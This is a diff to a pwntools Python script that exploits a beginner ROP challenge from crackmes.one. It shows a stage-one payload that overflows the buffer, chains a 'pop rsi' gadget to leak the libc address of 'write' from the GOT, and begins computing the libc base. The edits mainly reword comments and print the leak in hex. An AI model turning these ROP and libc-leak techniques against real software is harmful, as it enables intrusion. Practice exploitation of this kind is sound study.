@@ -1,3 +1,7 @@
+# A simple exploit to a rop challenge for beguinners from
+# https://crackmes.one/crackme/5f3d7ed033c5d42a7c667d95
+
+
 from pwn import *
 
 # OFFSETS OF INTEREST INSIDE libc.so.6
@@ -9,7 +13,7 @@ print("[*] STAGE 1")
 
 payload_stage_1	= 	b"A"*72				# junk bytes to reach rip
 payload_stage_1 +=	p64(0x0000000000400611)		# gadget "pop rsi"
-payload_stage_1	+= 	p64(0x601018)			# pointer to "write" address of libc
+payload_stage_1	+= 	p64(0x601018)			# address of "write" inside the Global Offset Table
 payload_stage_1 += 	p64(0x007ffff7ffd040)		# ...because the gadget has also a "pop r15" before "ret"
 payload_stage_1 += 	p64(0x0000000000400547)		# jump to "main" function to call "write" and leak address
 
@@ -20,9 +24,9 @@ p.recvuntil(": ")
 p.send(payload_stage_1)
 libc_write_addr = u64(p.recvn(8))
 
-print(f"[*] WRITE FUNCTION -> {libc_write_addr}")
+print(f"[*] WRITE FUNCTION -> {hex(libc_write_addr)}")
 
-# OFFSET CALCULATION ...
+# OFFSETS CALCULATION ...
 
 print("[*] STAGE 2")
 libc_base_addr = libc_write_addr - LIBC_WRITE_OFFSET
